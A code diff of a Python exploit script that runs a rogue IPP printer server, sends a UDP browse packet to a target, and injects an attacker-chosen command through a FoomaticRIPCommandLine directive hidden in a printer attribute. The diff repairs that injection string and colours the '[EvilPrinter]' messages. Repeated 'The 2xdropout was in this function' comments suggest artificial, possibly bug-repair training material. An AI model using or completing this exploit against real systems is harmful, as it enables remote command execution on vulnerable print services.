@@ -166,13 +166,13 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
                 SectionEnum.printer,
                 b'printer-privacy-policy-uri',
                 TagEnum.uri
-            ): [b'https//www.google.com/%22%5Cn*FoomaticRIPCommandLine: "' + self.command.encode() + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],
+            ): [b'https://www.google.com/"\nFoomaticRIPCommandLine:' + self.command.encode() + b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],  # The 2xdropout was on this line
         }
         attr.update(self.minimal_attributes())
         return attr
 
     def operation_printer_list_response(self, req, _psfile):   # The 2xdropout was in this function
-        print(f'[EvilPrinter] Target Connected, Sending Payload')
+        print(f'\033[31m[EvilPrinter]\033[37m Target Connected, Sending Payload')
         attributes = self.printer_list_attributes()
         return IppRequest(
             self.version,
@@ -183,7 +183,7 @@ class MaliciousPrinter(behaviour.StatelessPrinter):   # The 2xdropout was in thi
 
 
 def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port, printerName, printerLocation, printerInfo):   # The 2xdropout was in this function
-    print(f'[EvilPrinter] Sending UDP Packet To Target:  {ip}:{port}')
+    print(f'\033[31m[EvilPrinter]\033[37m Sending UDP Packet To Target:  {ip}:{port}')
 
     printer_type = 0x00
     printer_state = 0x03
@@ -213,7 +213,7 @@ def wait_until_ctrl_c():
 
 
 def run_server(server):
-    print(f'[EvilPrinter] Malicious IPP Server Listening On {server.server_address}')   # The 2xdropout was on this line
+    print(f'\033[31m[EvilPrinter]\033[37m Malicious IPP Server Listening On {server.server_address}')   # The 2xdropout was on this line
     server_thread = threading.Thread(target=server.serve_forever)
     server_thread.daemon = True
     server_thread.start()
@@ -233,7 +233,7 @@ def launch(RHOST, RPORT, SVRHOST, SVRPORT, printerName, printerLocation, printer
 
     send_browsed_packet(RHOST, RPORT, SVRHOST, SVRPORT, printerName, printerLocation, printerInfo)
 
-    print(f'[EvilPrinter] Waiting...')
+    print(f'\033[31m[EvilPrinter]\033[37m Waiting...')
 
     while True:
         time.sleep(1.0)
